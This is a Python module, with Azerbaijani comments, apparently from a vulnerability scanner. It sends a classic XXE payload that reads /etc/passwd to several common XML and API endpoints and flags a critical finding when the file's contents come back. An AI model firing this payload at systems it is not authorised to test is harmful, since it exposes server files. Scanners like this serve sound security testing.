"""
MODUL: XXE (XML External Entity)
================================
Server XML qəbul edib "xarici entity"-ləri emal edirsə, hücumçu server
fayllarını (məs: /etc/passwd) oxuya bilər.

Zərərsiz + DƏQİQ: XML qəbul edə bilən uc nöqtələrə XXE payload-u göndərir
və cavabda server faylının imzası (root:) görünərsə işarələyir.
"""

from core import http_client

# /etc/passwd oxumağa çalışan klassik XXE payload-u
PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    '<r>&x;</r>'
)
IMZA = "root:"
# Yoxlanılacaq ümumi XML/API uc nöqtələri
YOLLAR = ["", "/api", "/api/xml", "/xml", "/soap", "/xmlrpc.php", "/upload"]


def yoxla(bas_url, hesabat, timeout=8):
    bas = bas_url.rstrip("/")
    for yol in YOLLAR:
        url = bas + yol
        cavab = http_client.al(
            url, metod="POST", timeout=timeout,
            data=PAYLOAD,
            headers={"Content-Type": "application/xml"},
        )
        if cavab is not None and IMZA in (cavab.text or "") and "/bin/" in (cavab.text or ""):
            hesabat.elave_et("kritik", "xxe", url)
            return
